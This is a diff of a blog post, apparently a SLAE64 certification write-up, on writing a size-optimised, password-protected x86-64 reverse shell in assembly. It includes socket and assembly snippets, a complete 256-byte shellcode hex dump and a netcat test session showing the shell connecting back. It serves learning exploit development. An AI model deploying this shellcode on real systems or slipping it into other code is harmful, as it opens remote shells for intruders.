@@ -39,7 +39,7 @@ server.sin_addr.s_addr = inet_addr("127.0.0.1");  // 0x7f000001
 bzero(&server.sin_zero, 8);
 {{</ highlight >}}
 
-We're using the loopback <tt>127.0.0.1</tt> address for this example. Python does not have a <tt>inet_addr()</tt> function to find the hex value of an arbitrary address, but the <tt>inet_aton()</tt> function works in a similar way:
+We're using the loopback <tt>127.0.0.1</tt> address to keep things simple for this example. To insert an arbitrary address we can use Python to look up the hex conversion. The Python <tt>socket</tt> module does not have a <tt>inet_addr()</tt> function to convert an address string, but the <tt>inet_aton()</tt> function works in a similar way:
 
 {{< highlight text >}}
 MBP:slae64$ python
@@ -50,7 +50,7 @@ Type "help", "copyright", "credits" or "license" for more information.
 '\xc0\xa8\x00\xc8' 
 {{</ highlight >}}
 
-Remember that the value is a string and will need to be reversed when building the <tt>sockaddr_in</tt> structure in memory.
+Remember that the converted value is still a string and will need to be reversed when building the <tt>sockaddr_in</tt> structure in memory.
 
 ### Connecting the socket
 
@@ -65,11 +65,11 @@ if((connect(sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
 }
 {{</ highlight >}}
 
-There is no timeout or retry, a 'Connection Refused' error will occur if the target socket is not up, running and able to accept the connection.
+There is no timeout period or retry count on a client socket, a 'Connection Refused' error will occur if the target socket is not up, running and able to accept the connection.
 
 ### Validating the user
 
-There is no validation retry loop in this code. If an invalid password is returned from the prompt, the connection is dropped and the program exits. Depending on how the remote server is running, the remote socket could also be closed in response to the disconnect. There would be little point in immediately retrying the connection.
+The validation loop was removed for this program. If an invalid password is returned from the prompt, the connection is dropped and the program exits. Depending on how the remote server is running, the remote socket will probably also be closed in response to the disconnect. There would be little point in immediately retrying the connection.
 
 {{< highlight c >}}
 // Check password
@@ -265,6 +265,12 @@ These optimisations are small, but when applied over the whole program they can 
 
 Getting back to the code, we'll create and configure socket in the same way as last time. However, this time we need to populate the address field, remembering to build the in-memory string in reverse.
 
+The layout we're going for looks like this:
+
+![image](img/sockaddr_in_client.png)
+
+Some careful optimisation with <tt>INC</tt> and <tt>PUSH/POP</tt> instructions really helps reduce the byte count here. However, readability is sacrificed.
+
 {{< highlight asm >}}
 _main:
 ; Build a server sockaddr_in struct on the stack
@@ -296,13 +302,15 @@ _main:
     push rax            ; store socket id on stack
 {{</ highlight >}}  
 
+### Connecting to the remote host
+
 The <tt>connect</tt> syscall matches the C function:
 
  ID / RAX | Name | Arg1 / RDI | Arg2 / RSI | Arg3 / RDX 
 :---------|:-----|:-----------|:-----------|:-----------
 42 |<tt>sys_connect</tt>|<tt>int fd</tt>|<tt>struct sockaddr *uservaddr</tt>|<tt>int addrlen</tt>
 
-Because we know that the socket ID is the top value on the stack, we can use the <tt>POP/PUSH</tt> trick to load a register in two bytes rather then the 4 required for a <tt>mov rdi, [rbp-24]</tt> move with stack offset calculation. We also use the <tt>PUSH/POP</tt> absolute assign method to save a few extra bytes here when defining the constants. 
+Because we know that the socket ID is the top value on the stack, we can use the <tt>POP/PUSH</tt> trick to load a register in two bytes rather then the 4 required for a <tt>rdi,[rbp-24]</tt> move with stack offset calculation. We also use the <tt>PUSH/POP</tt> absolute assign method to save a few extra bytes here when defining the constants. 
 
 {{< highlight asm >}}
 ; Connect to remote host
@@ -318,13 +326,13 @@ Because we know that the socket ID is the top value on the stack, we can use the
     jle short _exit
 {{</ highlight >}}  
 
-Assuming the return in <tt>RAX</tt> (I'm actually using <tt>EAX</tt> to save a byte) is greater than -1, we have a connection to the remote host and can move on to the authentication.
+Assuming the return in <tt>RAX</tt> (I'm actually using <tt>CMP EAX</tt> to save a byte) is greater than -1, we have a connection to the remote host and can move on to the authentication.
 
 ### Authentication
 
-As previously stated, a visual prompt is required to let an operator on the listening host know that an incoming connection has been made. If the listening socket was under the control of some code rather than <tt>netcat</tt>, we could trigger actions on connect, but for the purpose of this exercise, we need to send a 'Hello' message.
+As previously stated, a visual prompt is required to let an operator on the listening host know that an incoming connection has been made. If the listening socket was under the control of some code rather than <tt>netcat</tt>, we could trigger actions on connect, but for the purpose of this exercise we need to send a 'Hello' message.
 
-The shortest thing I could come up with that still conveyed a request for input was a question mark. So, the prompt for a password is just that: a question mark followed by a newline. The strings start at the address pointed to by <tt>r15</tt> and the length of the string is 2. The <tt>_prompt</tt> function does the rest.
+The shortest thing I could come up with that still conveyed a request for input was a question mark. So, the prompt for a password is just that: a question mark followed by a newline. We know from our earlier jump, call, pop code that the strings start at the address pointed to by <tt>r15</tt>. We also provide the length of the string. The <tt>_prompt</tt> function does the rest.
 
 {{< highlight asm >}}
 ; Send message
@@ -334,7 +342,7 @@ The shortest thing I could come up with that still conveyed a request for input 
     call _prompt 
 {{</ highlight >}} 
 
-We don't need the <tt>sockaddr_in</tt> data any more, so we overwrite buffer 1 with the input received from the remote host. The socket ID is still top of the stack, so we can use the <tt>POP/PUSH</tt> trick again.
+We don't need the <tt>sockaddr_in</tt> data any more, so we are free to overwrite buffer 1 with the input received from the remote host. The socket ID is still top of the stack, so we can use the <tt>POP/PUSH</tt> trick again.
 
 {{< highlight asm >}}
 ; Listen for response
@@ -352,7 +360,7 @@ We don't need the <tt>sockaddr_in</tt> data any more, so we overwrite buffer 1 w
     syscall
 {{</ highlight >}}
 
-We covered string checks with <tt>CMPSB</tt> in the [last assessment](/slae64-01-bind-shell), so there is no need to dissect this. However, in the event of a mismatch, the <tt>_exit</tt> function is beyond the reach of a <tt>short</tt> jump, meaning we end up with a big 6 byte instruction. To get around this and extra location named <tt>_end</tt> was added before the final <tt>_exit</tt> call. This brings the jump back into short range and reduces a 6 byte long jump to just 2 bytes. 
+We covered string checks with <tt>CMPSB</tt> in the [last assessment](/slae64-01-bind-shell), so there is no need to dissect this. However, a small optimisation worth pointing out is the <tt>_exit</tt> handler. In the event of a mismatch, we need to stop the program. The <tt>_exit</tt> function back at the start of the code is beyond the 127 byte reach of a <tt>short</tt> jump, meaning we end up with a bloated 6 byte relative jump. To get around this, an extra location named <tt>_end</tt> was added before the final <tt>_exit</tt> call at the end of the code. This is within 127 bytes and reduces a 6 byte relative jump to a 2 byte short jump. 
 
 {{< highlight asm >}}
 ; Check for correct pass phrase
@@ -365,6 +373,8 @@ _cmploop:
     jne short _end      ; exit if no match
     loop _cmploop       ; next char 
 {{</ highlight >}}
+
+Using the <tt>short</tt> keyword forces the assembler to use the 2 byte jump instruction and will print errors when these jumps are out of range. It can be annoying to put the extra work in to manage these jumps, but it is well worth it to save 4 bytes.
 
 Assuming the password is validated, all that is left to do is set up the shell as before. These methods have been optimised for size, but the functionality is identical.
 
@@ -415,9 +425,9 @@ Note the <tt>_end</tt> label between the <tt>execve</tt> syscall and the final c
 
 ## Shellcode conversion and testing
 
-As with the reverse shell, this code contains inline string data which confuses the [Commandline Fu](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump) shellcode extractor. So the raw hex was extracted with my [Hexdump script](https://github.com/CodeheadUK/SLAE64/blob/master/misc/shellcode_extract.sh).
+As with the bind shell, this code contains inline string data which confuses the [Commandline Fu](http://www.commandlinefu.com/commands/view/12151/get-shellcode-of-the-binary-using-objdump) shellcode extractor. So the raw hex was extracted with my [Hexdump script](https://github.com/CodeheadUK/SLAE64/blob/master/misc/shellcode_extract.sh).
 
-The resulting shellcode comes in at 256 bytes which is pretty good, even with the strings and error checking left in, it is smaller than the cut down version of the reverse shell.
+The resulting shellcode comes in at 256 bytes which is pretty good. Even with the strings and error checking left in, it is smaller than the cut down version of the reverse shell. No pesky null bytes either.
 
 {{< highlight text >}}
 \x48\x89\xe5\xeb\x04\x41\x5f\xeb\x33\xe8\xf7\xff\xff\xff\x3f\x0a\x42\x69\x67\x53
@@ -435,8 +445,26 @@ The resulting shellcode comes in at 256 bytes which is pretty good, even with th
 \x7d\xf0\x50\x57\x48\x89\xe6\x04\x3b\x0f\x05\xe8\x31\xff\xff\xff
 {{</ highlight >}}
 
-Running
+Running the shellcode under [Vivek's Shellcode Wrapper](https://github.com/CodeheadUK/SLAE64/blob/master/misc/shellcode_wrapper.c), we see that the required functionality is present and working correctly:
 
+{{< highlight text >}}
+codehead@ubuntu:assignment_2$ nc -l 4444
+?
+NotThePassword
+codehead@ubuntu:assignment_2$ nc -l 4444
+?
+short
+codehead@ubuntu:assignment_2$ nc -l 4444
+?
+BigSecret
+OK
+pwd
+/home/codehead/SLAE64/assignment_2
+exit
+codehead@ubuntu:assignment_2$ 
+{{</ highlight >}}
+
+That completes this assessment. While the code was not ground breaking, working on the optimisation of shellcode size was a useful and interesting exercise. 
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 
